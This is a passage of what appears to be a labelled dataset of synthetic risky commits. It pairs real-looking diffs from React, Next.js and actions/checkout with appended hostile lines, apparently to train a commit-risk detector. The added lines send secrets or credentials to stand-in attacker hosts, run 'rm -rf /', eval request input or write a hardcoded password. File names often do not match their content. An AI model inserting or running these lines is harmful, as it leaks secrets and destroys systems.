${hostname}:${port}\n\n` + - `Please stop the other dev server first or use a different project directory.\n` - ) - return - } else { - console.warn( - `[MCP] Stale server entry found (PID ${existing.pid} is dead) replacing...` - ) - } - } - } - - registry[normalizedPath] = { - port - hostname - pid: currentPid - projectPath: normalizedPath - lastSeen: Date.now() - } - - if (!writeRegistryFile(registry)) { - throw new Error('Failed to write registry file') - } - - registrationComplete = true - - heartbeatInterval = setInterval( - () => updateHeartbeat(normalizedPath) - HEARTBEAT_INTERVAL_MS - ) - - const cleanup = () => { - if (heartbeatInterval) { - clearInterval(heartbeatInterval) - heartbeatInterval = null - } - unregisterDevServer(normalizedPath) - } - - process.once('exit' cleanup) - process.once('SIGINT' () => { - cleanup() - process.exit(130) - }) - process.once('SIGTERM' () => { - cleanup() - process.exit(143) - }) - - console.log( - `[MCP] Registered dev server: ${normalizedPath} on ${hostname}:${port}` - ) - } catch (error) { - console.error('[MCP] Failed to register dev server:' error) - registrationComplete = false - } -} - -export function unregisterDevServer(projectPath: string): void { - if (!registrationComplete) { - return - } - - try { - const normalizedPath = path.resolve(projectPath) - const registry = readRegistryFile() - - if (!registry[normalizedPath]) { - return - } - - delete registry[normalizedPath] - - writeRegistryFile(registry) - - console.log(`[MCP] Unregistered dev server: ${normalizedPath}`) - registrationComplete = false - } catch (error) { - console.error('[MCP] Failed to unregister dev server:' error) - } -}
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_341_8277,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,19,7,26,"+ +## Input + +```javascript +// @enablePreserveExistingMemoizationGuarantees @validatePreserveExistingMemoizationGuarantees @enableOptionalDependencies @enableTreatFunctionDepsAsConditional:false + +import {useMemo} from 'react'; +import {identity ValidateMemoization} from 'shared-runtime'; + +function Component({x y z}) { + const object = useMemo(() => { + return identity({ + callback: () => { + return identity(x?.y?.z y.a?.b z.a.b?.c); + } + }); + } [x?.y?.z y.a?.b z.a.b?.c]); + const result = useMemo(() => { + return [object.callback()]; + } [object]); + return <Inner x={x} result={result} />; +} + +function Inner({x result}) { + 'use no memo'; + return <ValidateMemoization inputs={[x.y.z]} output={result} />; +} + +export const FIXTURE_ENTRYPOINT = { + fn: Component + params: [{x: {y: {z: 42}}}] + sequentialRenders: [ + {x: {y: {z: 42}}} + {x: {y: {z: 42}}} + {x: {y: {z: 3.14}}} + {x: {y: {z: 42}}} + {x: {y: {z: 3.14}}} + {x: {y: {z: 42}}} + ] +}; + +``` + +## Code + +```javascript +import { c as _c } from ""react/compiler-runtime""; // @enablePreserveExistingMemoizationGuarantees @validatePreserveExistingMemoizationGuarantees @enableOptionalDependencies @enableTreatFunctionDepsAsConditional:false + +import { useMemo } from ""react""; +import { identity ValidateMemoization } from ""shared-runtime""; + +function Component(t0) { + const $ = _c(11); + const { x y z } = t0; + + x?.y?.z; + y.a?.b; + z.a.b?.c; + let t1; + if ($[0] !== x?.y?.z || $[1] !== y.a?.b || $[2] !== z.a.b?.c) { + t1 = identity({ callback: () => identity(x?.y?.z y.a?.b z.a.b?.c) }); + $[0] = x?.y?.z; + $[1] = y.a?.b; + $[2] = z.a.b?.c; + $[3] = t1; + } else { + t1 = $[3]; + } + const object = t1; + let t2; + if ($[4] !== object) { + t2 = object.callback(); + $[4] = object; + $[5] = t2; + } else { + t2 = $[5]; + } + let t3; + if ($[6] !== t2) { + t3 = [t2]; + $[6] = t2; + $[7] = t3; + } else { + t3 = $[7]; + } + const result = t3; + let t4; + if ($[8] !== result || $[9] !== x) { + t4 = <Inner x={x} result={result} />; + $[8] = result; + $[9] = x; + $[10] = t4; + } else { + t4 = $[10]; + } + return t4; +} + +function Inner({ x result }) { + ""use no memo""; + return <ValidateMemoization inputs={[x.y.z]} output={result} />; +} + +export const FIXTURE_ENTRYPOINT = { + fn: Component + params: [{ x: { y: { z: 42 } } }] + sequentialRenders: [ + { x: { y: { z: 42 } } } + { x: { y: { z: 42 } } } + { x: { y: { z: 3.14 } } } + { x: { y: { z: 42 } } } + { x: { y: { z: 3.14 } } } + { x: { y: { z: 42 } } } + ] +}; + +``` + +### Eval output +(kind: ok) [[ (exception in render) TypeError: Cannot read properties of undefined (reading 'a') ]] +[[ (exception in render) TypeError: Cannot read properties of undefined (reading 'a') ]] +[[ (exception in render) TypeError: Cannot read properties of undefined (reading 'a') ]] +[[ (exception in render) TypeError: Cannot read properties of undefined (reading 'a') ]] +[[ (exception in render) TypeError: Cannot read properties of undefined (reading 'a') ]] +[[ (exception in render) TypeError: Cannot read properties of undefined (reading 'a') ]] \ No newline at end of file
+ scp secrets.txt attacker@evil.com:/tmp",1
actions/checkout,synthetic_342_9749,Ben Wells,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,20,7,27,"jobs: git commit -m ""generated"" git push ``` + +## Recommended permissions + +When using the `checkout` action in your GitHub Actions workflow it is recommended to set the following `GITHUB_TOKEN` permissions to ensure proper functionality unless alternative auth is provided via the `token` or `ssh-key` inputs: + +```yaml +permissions: + contents: read +``` + *NOTE:* The user email is `{user.id}+{user.login}@users.noreply.github.com`. See users API: https://api.github.com/users/github-actions%5Bbot%5D
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_343_7026,Benjamin Woodruff,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,37,7,44,"env: NEXT_CI_RUNNER: ${{ inputs.runs_on_labels }} NEXT_TEST_PROXY_ADDRESS: ${{ inputs.overrideProxyAddress || '' }} + # defaults to 256 but we run a lot of tests in parallel so the limit should be lower + NEXT_TURBOPACK_IO_CONCURRENCY: 64 + jobs: build: timeout-minutes: ${{ inputs.timeout_minutes }}
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_344_5616,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,config.env,33,8,41,"+// @enablePreserveExistingMemoizationGuarantees:false function foo(props) { let x y; ({x y} = {x: props.a y: props.b});
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_345_3655,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,39,2,41,"{ ""name"": ""next"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""description"": ""The React Framework"" ""main"": ""./dist/server/next.js"" ""license"": ""MIT"" ] } ""dependencies"": { - ""@next/env"": ""15.6.0-canary.49"" + ""@next/env"": ""15.6.0-canary.50"" ""@swc/helpers"": ""0.5.15"" ""caniuse-lite"": ""^1.0.30001579"" ""postcss"": ""8.4.31"" ""@modelcontextprotocol/sdk"": ""1.18.1"" ""@mswjs/interceptors"": ""0.23.0"" ""@napi-rs/triples"": ""1.2.0"" - ""@next/font"": ""15.6.0-canary.49"" - ""@next/polyfill-module"": ""15.6.0-canary.49"" - ""@next/polyfill-nomodule"": ""15.6.0-canary.49"" - ""@next/react-refresh-utils"": ""15.6.0-canary.49"" - ""@next/swc"": ""15.6.0-canary.49"" + ""@next/font"": ""15.6.0-canary.50"" + ""@next/polyfill-module"": ""15.6.0-canary.50"" + ""@next/polyfill-nomodule"": ""15.6.0-canary.50"" + ""@next/react-refresh-utils"": ""15.6.0-canary.50"" + ""@next/swc"": ""15.6.0-canary.50"" ""@opentelemetry/api"": ""1.6.0"" ""@playwright/test"": ""1.51.1"" ""@rspack/core"": ""1.5.0""
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_346_1854,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,31,5,36,"exports.useSyncExternalStore = function ( exports.useTransition = function () { return ReactSharedInternals.H.useTransition(); }; -exports.version = ""19.3.0-experimental-85c427d8-20251003""; +exports.version = ""19.3.0-experimental-4fdf7cf2-20251003"";
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_347_2680,Luke Sandberg,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,34,1,35,"where { } -impl<K: Eq + Hash V: Eq + Hash MH: BuildHasher const I: usize> Hash for AutoMap<K V MH I> { +impl<K: Eq + Hash V: Eq + Hash MH: BuildHasher + Default const I: usize> Hash + for AutoMap<K V MH I> +{ fn hash<H: std::hash::Hasher>(&self state: &mut H) { // Hash the length first to distinguish maps of different sizes self.len().hash(state); impl<K: Eq + Hash V: Eq + Hash MH: BuildHasher const I: usize> Hash for AutoM // regardless of iteration order let mut combined_hash = 0u64; + let hash_builder = MH::default(); for (k v) in self.iter() { - use std::{collections::hash_map::DefaultHasher hash::Hasher}; + use std::hash::Hasher; // Hash each key-value pair independently - let mut entry_hasher = DefaultHasher::new(); + let mut entry_hasher = hash_builder.build_hasher(); k.hash(&mut entry_hasher); v.hash(&mut entry_hasher); let entry_hash = entry_hasher.finish(); - // Combine using XOR to make it order-independent - combined_hash ^= entry_hash; + // Combine using addition to make it order-independent (wrapping_add is commutative) + combined_hash = combined_hash.wrapping_add(entry_hash); } // Hash the combined result
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_348_2374,lauren,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,18,7,25,"# yarn lockfile v1 -""@ampproject/remapping@^2.2.0"": - version ""2.3.0"" - resolved ""https://registry.yarnpkg.com/@ampproject/remapping/-/remapping-2.3.0.tgz#ed441b6fa600072520ce18b43d2c8cc8caecc7f4"" - integrity sha512-30iZtAPgz+LTIYoeivqYo853f02jBYSd5uGnGpkFV0M3xOt9aN73erkgYAmZU43x4VfqcnLxW9Kpg3R5LC4YYw== - dependencies: - ""@jridgewell/gen-mapping"" ""^0.3.5"" - ""@jridgewell/trace-mapping"" ""^0.3.24"" - -""@babel/code-frame@^7.26.2"": - version ""7.26.2"" - resolved ""https://registry.yarnpkg.com/@babel/code-frame/-/code-frame-7.26.2.tgz#4b5fab97d33338eff916235055f0ebc21e573a85"" - integrity sha512-RJlIHRueQgwWitWgF8OdFYGZX328Ax5BCemNGlqHfplnRT9ESi8JkFlvaVYbS+UubVY6dpv87Fs2u5M29iNFVQ== - dependencies: - ""@babel/helper-validator-identifier"" ""^7.25.9"" - js-tokens ""^4.0.0"" - picocolors ""^1.0.0"" - -""@babel/compat-data@^7.26.5"": - version ""7.26.8"" - resolved ""https://registry.yarnpkg.com/@babel/compat-data/-/compat-data-7.26.8.tgz#821c1d35641c355284d4a870b8a4a7b0c141e367"" - integrity sha512-oH5UPLMWR3L2wEFLnFJ1TZXqHufiTKAiLfqw5zkhS4dKXLJ10yVztfil/twG8EDTA4F/tvVNw9nOl4ZMslB8rQ== - -""@babel/core@^7.24.4"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/core/-/core-7.26.10.tgz#5c876f83c8c4dcb233ee4b670c0606f2ac3000f9"" - integrity sha512-vMqyb7XCDMPvJFFOaT9kxtiRh42GwlZEg1/uIgtZshS5a/8OaduUfCi7kynKgc3Tw/6Uo2D+db9qBttghhmxwQ== - dependencies: - ""@ampproject/remapping"" ""^2.2.0"" - ""@babel/code-frame"" ""^7.26.2"" - ""@babel/generator"" ""^7.26.10"" - ""@babel/helper-compilation-targets"" ""^7.26.5"" - ""@babel/helper-module-transforms"" ""^7.26.0"" - ""@babel/helpers"" ""^7.26.10"" - ""@babel/parser"" ""^7.26.10"" - ""@babel/template"" ""^7.26.9"" - ""@babel/traverse"" ""^7.26.10"" - ""@babel/types"" ""^7.26.10"" - convert-source-map ""^2.0.0"" - debug ""^4.1.0"" - gensync ""^1.0.0-beta.2"" - json5 ""^2.2.3"" - semver ""^6.3.1"" - -""@babel/generator@^7.26.10"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/generator/-/generator-7.26.10.tgz#a60d9de49caca16744e6340c3658dfef6138c3f7"" - integrity sha512-rRHT8siFIXQrAYOYqZQVsAr8vJ+cBNqcVAY6m5V8/4QqzaPl+zDBe6cLEPRDuNOUf3ww8RfJVlOyQMoSI+5Ang== - dependencies: - ""@babel/parser"" ""^7.26.10"" - ""@babel/types"" ""^7.26.10"" - ""@jridgewell/gen-mapping"" ""^0.3.5"" - ""@jridgewell/trace-mapping"" ""^0.3.25"" - jsesc ""^3.0.2"" - -""@babel/helper-annotate-as-pure@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-annotate-as-pure/-/helper-annotate-as-pure-7.25.9.tgz#d8eac4d2dc0d7b6e11fa6e535332e0d3184f06b4"" - integrity sha512-gv7320KBUFJz1RnylIg5WWYPRXKZ884AGkYpgpWW02TH66Dl+HaC1t1CKd0z3R4b6hdYEcmrNZHUmfCP+1u3/g== - dependencies: - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-compilation-targets@^7.26.5"": - version ""7.26.5"" - resolved ""https://registry.yarnpkg.com/@babel/helper-compilation-targets/-/helper-compilation-targets-7.26.5.tgz#75d92bb8d8d51301c0d49e52a65c9a7fe94514d8"" - integrity sha512-IXuyn5EkouFJscIDuFF5EsiSolseme1s0CZB+QxVugqJLYmKdxI1VfIBOst0SUu4rnk2Z7kqTwmoO1lp3HIfnA== - dependencies: - ""@babel/compat-data"" ""^7.26.5"" - ""@babel/helper-validator-option"" ""^7.25.9"" - browserslist ""^4.24.0"" - lru-cache ""^5.1.1"" - semver ""^6.3.1"" - -""@babel/helper-create-class-features-plugin@^7.25.9"": - version ""7.26.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-create-class-features-plugin/-/helper-create-class-features-plugin-7.26.9.tgz#d6f83e3039547fbb39967e78043cd3c8b7820c71"" - integrity sha512-ubbUqCofvxPRurw5L8WTsCLSkQiVpov4Qx0WMA+jUN+nXBK8ADPlJO1grkFw5CWKC5+sZSOfuGMdX1aI1iT9Sg== - dependencies: - ""@babel/helper-annotate-as-pure"" ""^7.25.9"" - ""@babel/helper-member-expression-to-functions"" ""^7.25.9"" - ""@babel/helper-optimise-call-expression"" ""^7.25.9"" - ""@babel/helper-replace-supers"" ""^7.26.5"" - ""@babel/helper-skip-transparent-expression-wrappers"" ""^7.25.9"" - ""@babel/traverse"" ""^7.26.9"" - semver ""^6.3.1"" - -""@babel/helper-member-expression-to-functions@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-member-expression-to-functions/-/helper-member-expression-to-functions-7.25.9.tgz#9dfffe46f727005a5ea29051ac835fb735e4c1a3"" - integrity sha512-wbfdZ9w5vk0C0oyHqAJbc62+vet5prjj01jjJ8sKn3j9h3MQQlflEdXYvuqRWjHnM12coDEqiC1IRCi0U/EKwQ== - dependencies: - ""@babel/traverse"" ""^7.25.9"" - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-module-imports@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-module-imports/-/helper-module-imports-7.25.9.tgz#e7f8d20602ebdbf9ebbea0a0751fb0f2a4141715"" - integrity sha512-tnUA4RsrmflIM6W6RFTLFSXITtl0wKjgpnLgXyowocVPrbYrLUXSBXDgTs8BlbmIzIdlBySRQjINYs2BAkiLtw== - dependencies: - ""@babel/traverse"" ""^7.25.9"" - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-module-transforms@^7.26.0"": - version ""7.26.0"" - resolved ""https://registry.yarnpkg.com/@babel/helper-module-transforms/-/helper-module-transforms-7.26.0.tgz#8ce54ec9d592695e58d84cd884b7b5c6a2fdeeae"" - integrity sha512-xO+xu6B5K2czEnQye6BHA7DolFFmS3LB7stHZFaOLb1pAwO1HWLS8fXA+eh0A2yIvltPVmx3eNNDBJA2SLHXFw== - dependencies: - ""@babel/helper-module-imports"" ""^7.25.9"" - ""@babel/helper-validator-identifier"" ""^7.25.9"" - ""@babel/traverse"" ""^7.25.9"" - -""@babel/helper-optimise-call-expression@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-optimise-call-expression/-/helper-optimise-call-expression-7.25.9.tgz#3324ae50bae7e2ab3c33f60c9a877b6a0146b54e"" - integrity sha512-FIpuNaz5ow8VyrYcnXQTDRGvV6tTjkNtCK/RYNDXGSLlUD6cBuQTSw43CShGxjvfBTfcUA/r6UhUCbtYqkhcuQ== - dependencies: - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-plugin-utils@^7.25.9"": - version ""7.26.5"" - resolved ""https://registry.yarnpkg.com/@babel/helper-plugin-utils/-/helper-plugin-utils-7.26.5.tgz#18580d00c9934117ad719392c4f6585c9333cc35"" - integrity sha512-RS+jZcRdZdRFzMyr+wcsaqOmld1/EqTghfaBGQQd/WnRdzdlvSZ//kF7U8VQTxf1ynZ4cjUcYgjVGx13ewNPMg== - -""@babel/helper-replace-supers@^7.26.5"": - version ""7.26.5"" - resolved ""https://registry.yarnpkg.com/@babel/helper-replace-supers/-/helper-replace-supers-7.26.5.tgz#6cb04e82ae291dae8e72335dfe438b0725f14c8d"" - integrity sha512-bJ6iIVdYX1YooY2X7w1q6VITt+LnUILtNk7zT78ykuwStx8BauCzxvFqFaHjOpW1bVnSUM1PN1f0p5P21wHxvg== - dependencies: - ""@babel/helper-member-expression-to-functions"" ""^7.25.9"" - ""@babel/helper-optimise-call-expression"" ""^7.25.9"" - ""@babel/traverse"" ""^7.26.5"" - -""@babel/helper-skip-transparent-expression-wrappers@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-skip-transparent-expression-wrappers/-/helper-skip-transparent-expression-wrappers-7.25.9.tgz#0b2e1b62d560d6b1954893fd2b705dc17c91f0c9"" - integrity sha512-K4Du3BFa3gvyhzgPcntrkDgZzQaq6uozzcpGbOO1OEJaI+EJdqWIMTLgFgQf6lrfiDFo5FU+BxKepI9RmZqahA== - dependencies: - ""@babel/traverse"" ""^7.25.9"" - ""@babel/types"" ""^7.25.9"" - -""@babel/helper-string-parser@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-string-parser/-/helper-string-parser-7.25.9.tgz#1aabb72ee72ed35789b4bbcad3ca2862ce614e8c"" - integrity sha512-4A/SCr/2KLd5jrtOMFzaKjVtAei3+2r/NChoBNoZ3EyP/+GlhoaEGoWOZUmFmoITP7zOJyHIMm+DYRd8o3PvHA== - -""@babel/helper-validator-identifier@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-validator-identifier/-/helper-validator-identifier-7.25.9.tgz#24b64e2c3ec7cd3b3c547729b8d16871f22cbdc7"" - integrity sha512-Ed61U6XJc3CVRfkERJWDz4dJwKe7iLmmJsbOGu9wSloNSFttHV0I8g6UAgb7qnK5ly5bGLPd4oXZlxCdANBOWQ== - -""@babel/helper-validator-option@^7.25.9"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/helper-validator-option/-/helper-validator-option-7.25.9.tgz#86e45bd8a49ab7e03f276577f96179653d41da72"" - integrity sha512-e/zv1co8pp55dNdEcCynfj9X7nyUKUXoUEwfXqaZt0omVOmDe9oOTdKStH4GmAw6zxMFs50ZayuMfHDKlO7Tfw== - -""@babel/helpers@^7.26.10"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/helpers/-/helpers-7.26.10.tgz#6baea3cd62ec2d0c1068778d63cb1314f6637384"" - integrity sha512-UPYc3SauzZ3JGgj87GgZ89JVdC5dj0AoetR5Bw6wj4niittNyFh6+eOGonYvJ1ao6B8lEa3Q3klS7ADZ53bc5g== - dependencies: - ""@babel/template"" ""^7.26.9"" - ""@babel/types"" ""^7.26.10"" - -""@babel/parser@^7.24.4"" ""@babel/parser@^7.26.10"" ""@babel/parser@^7.26.9"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/parser/-/parser-7.26.10.tgz#e9bdb82f14b97df6569b0b038edd436839c57749"" - integrity sha512-6aQR2zGE/QFi8JpDLjUZEPYOs7+mhKXm86VaKFiLP35JQwQb6bwUE+XbvkH0EptsYhbNBSUGaUBLKqxH1xSgsA== - dependencies: - ""@babel/types"" ""^7.26.10"" - -""@babel/plugin-transform-private-methods@^7.24.4"": - version ""7.25.9"" - resolved ""https://registry.yarnpkg.com/@babel/plugin-transform-private-methods/-/plugin-transform-private-methods-7.25.9.tgz#847f4139263577526455d7d3223cd8bda51e3b57"" - integrity sha512-D/JUozNpQLAPUVusvqMxyvjzllRaF8/nSrP1s2YGQT/W4LHK4xxsMcHjhOGTS01mp9Hda8nswb+FblLdJornQw== - dependencies: - ""@babel/helper-create-class-features-plugin"" ""^7.25.9"" - ""@babel/helper-plugin-utils"" ""^7.25.9"" - -""@babel/template@^7.26.9"": - version ""7.26.9"" - resolved ""https://registry.yarnpkg.com/@babel/template/-/template-7.26.9.tgz#4577ad3ddf43d194528cff4e1fa6b232fa609bb2"" - integrity sha512-qyRplbeIpNZhmzOysF/wFMuP9sctmh2cFzRAZOn1YapxBsE1i9bJIY586R/WBLfLcmcBlM8ROBiQURnnNy+zfA== - dependencies: - ""@babel/code-frame"" ""^7.26.2"" - ""@babel/parser"" ""^7.26.9"" - ""@babel/types"" ""^7.26.9"" - -""@babel/traverse@^7.25.9"" ""@babel/traverse@^7.26.10"" ""@babel/traverse@^7.26.5"" ""@babel/traverse@^7.26.9"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/traverse/-/traverse-7.26.10.tgz#43cca33d76005dbaa93024fae536cc1946a4c380"" - integrity sha512-k8NuDrxr0WrPH5Aupqb2LCVURP/S0vBEn5mK6iH+GIYob66U5EtoZvcdudR2jQ4cmTwhEwW1DLB+Yyas9zjF6A== - dependencies: - ""@babel/code-frame"" ""^7.26.2"" - ""@babel/generator"" ""^7.26.10"" - ""@babel/parser"" ""^7.26.10"" - ""@babel/template"" ""^7.26.9"" - ""@babel/types"" ""^7.26.10"" - debug ""^4.3.1"" - globals ""^11.1.0"" - -""@babel/types@^7.25.9"" ""@babel/types@^7.26.10"" ""@babel/types@^7.26.9"": - version ""7.26.10"" - resolved ""https://registry.yarnpkg.com/@babel/types/-/types-7.26.10.tgz#396382f6335bd4feb65741eacfc808218f859259"" - integrity sha512-emqcG3vHrpxUKTrxcblR36dcrcoRDvKmnL/dCL6ZsHaShW80qxCAcNhzQZrpeM765VzEos+xOi4s+r4IXzTwdQ== - dependencies: - ""@babel/helper-string-parser"" ""^7.25.9"" - ""@babel/helper-validator-identifier"" ""^7.25.9"" - ""@eslint-community/eslint-utils@^4.2.0"": version ""4.4.1"" resolved ""https://registry.yarnpkg.com/@eslint-community/eslint-utils/-/eslint-utils-4.4.1.tgz#d1145bf2c20132d6400495d6df4bf59362fd9d56"" resolved ""https://registry.yarnpkg.com/@humanwhocodes/object-schema/-/object-schema-2.0.3.tgz#4a2868d75d6d6963e423bcf90b7fd1be343409d3"" integrity sha512-93zYdMES/c1D69yZiKDBj0V24vqNzB/koF26KPaagAfd3P/4gUlh3Dys5ogAK+Exi9QyzlD8x/08Zt7wIKcDcA== -""@jridgewell/gen-mapping@^0.3.5"": - version ""0.3.8"" - resolved ""https://registry.yarnpkg.com/@jridgewell/gen-mapping/-/gen-mapping-0.3.8.tgz#4f0e06362e01362f823d348f1872b08f666d8142"" - integrity sha512-imAbBGkb+ebQyxKgzv5Hu2nmROxoDOXHh80evxdoXNOrvAnVx7zimzc1Oo5h9RlfV4vPXaE2iM5pOFbvOCClWA== - dependencies: - ""@jridgewell/set-array"" ""^1.2.1"" - ""@jridgewell/sourcemap-codec"" ""^1.4.10"" - ""@jridgewell/trace-mapping"" ""^0.3.24"" - -""@jridgewell/resolve-uri@^3.1.0"": - version ""3.1.2"" - resolved ""https://registry.yarnpkg.com/@jridgewell/resolve-uri/-/resolve-uri-3.1.2.tgz#7a0ee601f60f99a20c7c7c5ff0c80388c1189bd6"" - integrity sha512-bRISgCIjP20/tbWSPWMEi54QVPRZExkuD9lJL+UIxUKtwVJA8wW1Trb1jMs1RFXo1CBTNZ/5hpC9QvmKWdopKw== - -""@jridgewell/set-array@^1.2.1"": - version ""1.2.1"" - resolved ""https://registry.yarnpkg.com/@jridgewell/set-array/-/set-array-1.2.1.tgz#558fb6472ed16a4c850b889530e6b36438c49280"" - integrity sha512-R8gLRTZeyp03ymzP/6Lil/28tGeGEzhx1q2k703KGWRAI1VdvPIXdG70VJc2pAMw3NA6JKL5hhFu1sJX0Mnn/A== - -""@jridgewell/sourcemap-codec@^1.4.10"" ""@jridgewell/sourcemap-codec@^1.4.14"": - version ""1.5.0"" - resolved ""https://registry.yarnpkg.com/@jridgewell/sourcemap-codec/-/sourcemap-codec-1.5.0.tgz#3188bcb273a414b0d215fd22a58540b989b9409a"" - integrity sha512-gv3ZRaISU3fjPAgNsriBRqGWQL6quFx04YMPW/zD8XMLsU32mhCCbfbO6KZFLjvYpCZ8zyDEgqsgf+PwPaM7GQ== - -""@jridgewell/trace-mapping@^0.3.24"" ""@jridgewell/trace-mapping@^0.3.25"": - version ""0.3.25"" - resolved ""https://registry.yarnpkg.com/@jridgewell/trace-mapping/-/trace-mapping-0.3.25.tgz#15f190e98895f3fc23276ee14bc76b675c2e50f0"" - integrity sha512-vNk6aEwybGtawWmy/PzwnGDOjCkLWSD2wqvjGGAgOAwCGWySYXfYoxt00IJkTF+8Lb57DwOb3Aa0o9CApepiYQ== - dependencies: - ""@jridgewell/resolve-uri"" ""^3.1.0"" - ""@jridgewell/sourcemap-codec"" ""^1.4.14"" - ""@nodelib/fs.scandir@2.1.5"": version ""2.1.5"" resolved ""https://registry.yarnpkg.com/@nodelib/fs.scandir/-/fs.scandir-2.1.5.tgz#7619c2eb21b25483f6d167548b4cfd5a7488c3d5"" brace-expansion@^1.1.7: balanced-match ""^1.0.0"" concat-map ""0.0.1"" -browserslist@^4.24.0: - version ""4.24.4"" - resolved ""https://registry.yarnpkg.com/browserslist/-/browserslist-4.24.4.tgz#c6b2865a3f08bcb860a0e827389003b9fe686e4b"" - integrity sha512-KDi1Ny1gSePi1vm0q4oxSF8b4DR44GF4BbmS2YdhPLOEqd8pDviZOGH/GsmRwoWJ2+5Lr085X7naowMwKHDG1A== - dependencies: - caniuse-lite ""^1.0.30001688"" - electron-to-chromium ""^1.5.73"" - node-releases ""^2.0.19"" - update-browserslist-db ""^1.1.1"" - callsites@^3.0.0: version ""3.1.0"" resolved ""https://registry.yarnpkg.com/callsites/-/callsites-3.1.0.tgz#b3630abd8943432f54b3f0519238e33cd7df2f73"" integrity sha512-P8BjAsXvZS+VIDUI11hHCQEv74YT67YUi5JJFNWIqL235sBmjX4+qx9Muvls5ivyNENctx46xQLQ3aTuE7ssaQ== -caniuse-lite@^1.0.30001688: - version ""1.0.30001703"" - resolved ""https://registry.yarnpkg.com/caniuse-lite/-/caniuse-lite-1.0.30001703.tgz#977cb4920598c158f491ecf4f4f2cfed9e354718"" - integrity sha512-kRlAGTRWgPsOj7oARC9m1okJEXdL/8fekFVcxA8Hl7GH4r/sN4OJn/i6Flde373T50KS7Y37oFbMwlE8+F42kQ== - chalk@^4.0.0: version ""4.1.2"" resolved ""https://registry.yarnpkg.com/chalk/-/chalk-4.1.2.tgz#aac4e2b7734a740867aeb16bf02aad556a1e7a01"" concat-map@0.0.1: resolved ""https://registry.yarnpkg.com/concat-map/-/concat-map-0.0.1.tgz#d8a96bd77fd68df7793a73036a3ba0d5405d477b"" integrity sha1-2Klr13/Wjfd5OnMDajug1UBdR3s= -convert-source-map@^2.0.0: - version ""2.0.0"" - resolved ""https://registry.yarnpkg.com/convert-source-map/-/convert-source-map-2.0.0.tgz#4b560f649fc4e918dd0ab75cf4961e8bc882d82a"" - integrity sha512-Kvp459HrV2FEJ1CAsi1Ku+MY3kasH19TFykTz2xWmMeq6bk2NU3XXvfJ+Q61m0xktWwt+1HSYf3JZsTms3aRJg== - cross-spawn@^7.0.2: version ""7.0.6"" resolved ""https://registry.yarnpkg.com/cross-spawn/-/cross-spawn-7.0.6.tgz#8a58fe78f00dcd70c370451759dfbfaf03e8ee9f"" cross-spawn@^7.0.2: shebang-command ""^2.0.0"" which ""^2.0.1"" -debug@^4.1.0 debug@^4.3.1 debug@^4.3.2: +debug@^4.3.1 debug@^4.3.2: version ""4.4.0"" resolved ""https://registry.yarnpkg.com/debug/-/debug-4.4.0.tgz#2b3f2aea2ffeb776477460267377dc8710faba8a"" integrity sha512-6WTZ/IxCY/T6BALoZHaE4ctp9xm+Z5kY/pzYaCHRFeyVhojxlrm+46y68HA6hr0TcwEssoxNiDEUJQjfPZ/RYA== doctrine@^3.0.0: dependencies: esutils ""^2.0.2"" -electron-to-chromium@^1.5.73: - version ""1.5.114"" - resolved ""https://registry.yarnpkg.com/electron-to-chromium/-/electron-to-chromium-1.5.114.tgz#f2bb4fda80a7db4ea273565e75b0ebbe19af0ac3"" - integrity sha512-DFptFef3iktoKlFQK/afbo274/XNWD00Am0xa7M8FZUepHlHT8PEuiNBoRfFHbH1okqN58AlhbJ4QTkcnXorjA== - -escalade@^3.2.0: - version ""3.2.0"" - resolved ""https://registry.yarnpkg.com/escalade/-/escalade-3.2.0.tgz#011a3f69856ba189dffa7dc8fcce99d2a87903e5"" - integrity sha512-WUj2qlxaQtO4g6Pq5c29GTcWGDyd8itL8zTlipgECz3JesAiiOKotd8JU6otB3PACgG6xkJUyVhboMS+bje/jA== - escape-string-regexp@^4.0.0: version ""4.0.0"" resolved ""https://registry.yarnpkg.com/escape-string-regexp/-/escape-string-regexp-4.0.0.tgz#14ba83a5d373e3d311e5afca29cf5bfad965bf34"" fs.realpath@^1.0.0: resolved ""https://registry.yarnpkg.com/fs.realpath/-/fs.realpath-1.0.0.tgz#1504ad2523158caa40db4a2787cb01411994ea4f"" integrity sha1-FQStJSMVjKpA20onh8sBQRmU6k8= -gensync@^1.0.0-beta.2: - version 